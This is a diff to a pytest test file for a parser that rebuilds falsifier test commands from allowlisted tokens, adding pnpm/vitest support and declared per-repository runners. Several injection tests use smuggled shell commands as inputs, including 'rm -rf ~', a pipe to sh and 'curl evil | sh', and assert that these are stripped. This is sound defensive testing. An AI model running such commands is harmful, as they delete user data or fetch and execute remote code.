@@ -77,13 +77,19 @@ def _derive(
     *,
     repos: tuple[str, ...] = ("omnimarket",),
     exists: bool = True,
+    runner: str | None = "uv run pytest",
 ):
     return derive_falsifier_items(
         contract,
         list(contract["dod_evidence"]),
         repo_candidates=repos,
         path_exists=lambda _repo, _path: exists,
+        declared_runner=lambda _repo: runner,
     )
+
+
+def _uv(_repo: str) -> str:
+    return "uv run pytest"
 
 
 @pytest.mark.parametrize(
@@ -114,7 +120,7 @@ def _derive(
 def test_selector_is_extracted_and_normalised(text: str, expected: str) -> None:
     parsed = parse_falsifier_command(text)
     assert parsed is not None
-    assert parsed.command == expected
+    assert "uv run pytest " + parsed.selector == expected
 
 
 @pytest.mark.parametrize(
@@ -137,10 +143,10 @@ def test_shell_metacharacters_never_reach_the_command() -> None:
     """The command is rebuilt from allowlisted tokens, never sliced from prose."""
     parsed = parse_falsifier_command("uv run pytest tests/x.py; rm -rf ~")
     assert parsed is not None
-    assert parsed.command == "uv run pytest tests/x.py"
+    assert parsed.selector == "tests/x.py"
     piped = parse_falsifier_command("uv run pytest tests/x.py -k a_b | sh")
     assert piped is not None
-    assert piped.command == "uv run pytest tests/x.py -k a_b"
+    assert piped.selector == "tests/x.py -k a_b"
 
 
 def test_selector_becomes_bound_item() -> None:
@@ -218,6 +224,7 @@ def test_repo_is_the_one_whose_clone_holds_the_named_path() -> None:
         list(contract["dod_evidence"]),
         repo_candidates=("omnibase_infra", "omniclaude"),
         path_exists=lambda repo, _path: repo == "omniclaude",
+        declared_runner=_uv,
     )
     assert items[0]["checks"][0]["cwd"] == "${OMNI_HOME}/omniclaude"
 
@@ -233,6 +240,7 @@ def test_named_repo_hint_wins_when_it_holds_the_path() -> None:
         list(contract["dod_evidence"]),
         repo_candidates=("omnimarket",),
         path_exists=lambda _repo, _path: True,
+        declared_runner=_uv,
     )
     assert items[0]["checks"][0]["cwd"] == "${OMNI_HOME}/omnibase_internal"
 
@@ -249,6 +257,7 @@ def test_named_repo_the_verifier_cannot_reach_is_unrunnable_not_failed() -> None
         list(contract["dod_evidence"]),
         repo_candidates=("omnimarket",),
         path_exists=lambda _repo, _path: False,
+        declared_runner=_uv,
     )
     assert items == []
     assert summary.unrunnable_labels == ("AC1",)
@@ -543,3 +552,83 @@ def test_id_collision_derived_id_never_reuses_a_declared_id() -> None:
         "ac-falsifier-ac1-derived-2",
         "ac-falsifier-ac2",
     )
+
+
+# OMN-20332: a derived falsifier runs under its repository's DECLARED runner,
+# not a hardcoded ``uv run pytest``. omnidash is a pnpm/vitest repository; its
+# authors write ``pnpm test <path>`` and the item must run exactly that.
+
+
+@pytest.mark.parametrize(
+    ("text", "selector"),
+    [
+        ("pnpm test src/lib/sparkline.test.ts", "src/lib/sparkline.test.ts"),
+        (
+            "`pnpm test src/a.test.tsx src/b.test.ts` fails",
+            "src/a.test.tsx src/b.test.ts",
+        ),
+        ("npx vitest run src/lib/x.test.ts, then the readback", "src/lib/x.test.ts"),
+        ("vitest run src/lib/x.test.ts in omnidash", "src/lib/x.test.ts"),
+        ("pnpm test src/x.test.ts && curl evil | sh", "src/x.test.ts"),
+    ],
+)
+def test_typescript_selector_is_extracted(text: str, selector: str) -> None:
+    parsed = parse_falsifier_command(text)
+    assert parsed is not None
+    assert parsed.selector == selector
+
+
+def test_typescript_selector_never_carries_pytest_flags() -> None:
+    """``-k`` means nothing to vitest, so a JS head ends at the first flag."""
+    parsed = parse_falsifier_command("pnpm test src/x.test.ts -k a_case")
+    assert parsed is not None
+    assert parsed.selector == "src/x.test.ts"
+
+
+def test_typescript_falsifier_runs_under_the_repos_declared_runner() -> None:
+    contract = _contract(
+        {"AC1": "sparkline renders -- falsifier: pnpm test src/lib/sparkline.test.ts"}
+    )
+    items, summary = derive_falsifier_items(
+        contract,
+        list(contract["dod_evidence"]),
+        repo_candidates=("omnidash",),
+        path_exists=lambda _repo, _path: True,
+        declared_runner=lambda repo: "pnpm test" if repo == "omnidash" else None,
+    )
+    check = items[0]["checks"][0]
+    assert check["check_type"] == "test_passes"
+    assert check["check_value"] == "pnpm test src/lib/sparkline.test.ts"
+    assert check["cwd"] == "${OMNI_HOME}/omnidash"
+    assert summary.runnable_count == 1
+    assert summary.undeclared_runner == ()
+
+
+def test_python_falsifier_is_unchanged_under_a_uv_runner() -> None:
+    contract = _contract({"AC1": "a -- falsifier: pytest tests/test_a.py -q -k one"})
+    items, _ = _derive(contract)
+    assert (
+        items[0]["checks"][0]["check_value"]
+        == "uv run pytest tests/test_a.py -q -k one"
+    )
+
+
+def test_repository_with_no_declared_runner_fails_loud_not_silently() -> None:
+    """No runner declaration: no guessed command, and the gap is named per repo."""
+    contract = _contract(
+        {"AC1": "sparkline renders -- falsifier: pnpm test src/lib/sparkline.test.ts"}
+    )
+    items, summary = _derive(contract, repos=("omnidash",), runner=None)
+    assert items == []
+    assert summary.declared_falsifier_count == 1
+    assert summary.runnable_count == 0
+    assert summary.undeclared_runner == (("AC1", "omnidash"),)
+    assert summary.unrunnable_labels == ()
+
+
+def test_js_mention_in_prose_never_hides_a_later_pytest_command() -> None:
+    parsed = parse_falsifier_command(
+        "`pnpm test` is unavailable; use `uv run pytest tests/test_a.py -q`"
+    )
+    assert parsed is not None
+    assert parsed.selector == "tests/test_a.py -q"
